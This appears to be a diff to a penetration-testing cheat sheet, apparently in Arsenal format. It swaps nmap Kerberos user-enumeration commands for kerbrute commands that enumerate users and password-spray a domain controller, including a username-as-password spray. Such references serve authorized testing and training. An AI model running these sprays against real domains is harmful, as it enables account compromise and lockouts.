@@ -5,19 +5,19 @@
 ## Kerbrute usersenum
 #plateform/linux #target/remote #port/88 #protocol/kerberos #cat/ATTACK/BRUTEFORCE-SPRAY 
 ```
-./kerbrute_linux_amd64 userenum -d <domain> --dc <ip> <users_file>
+kerbrute userenum --dc <dc_ip> <users_wordlist>
 ```
 
-## kerberos enum users
-#plateform/linux #target/remote #port/88 #protocol/kerberos #cat/RECON 
+## Kerbrute password spraying user=pass
+#plateform/linux #target/remote #port/88 #protocol/kerberos #cat/ATTACK/BRUTEFORCE-SPRAY 
 ```
-nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='<domain>'" <ip>
+kerbrute passwordspray --dc <dc_ip> -d <domain> <users_wordlist> --user-as-pass
 ```
 
-## kerberos enum users (with user list)
-#plateform/linux #target/remote #port/88 #protocol/kerberos #cat/ATTACK/BRUTEFORCE-SPRAY
+## Kerbrute password spraying
+#plateform/linux #target/remote #port/88 #protocol/kerberos #cat/ATTACK/BRUTEFORCE-SPRAY 
 ```
-nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='<domain>',userdb=<users_list_file>" <ip>
+kerbrute passwordspray --dc <dc_ip> -d <domain> <users_wordlist> <password>
 ```
 
 ## kerberos ms14-068
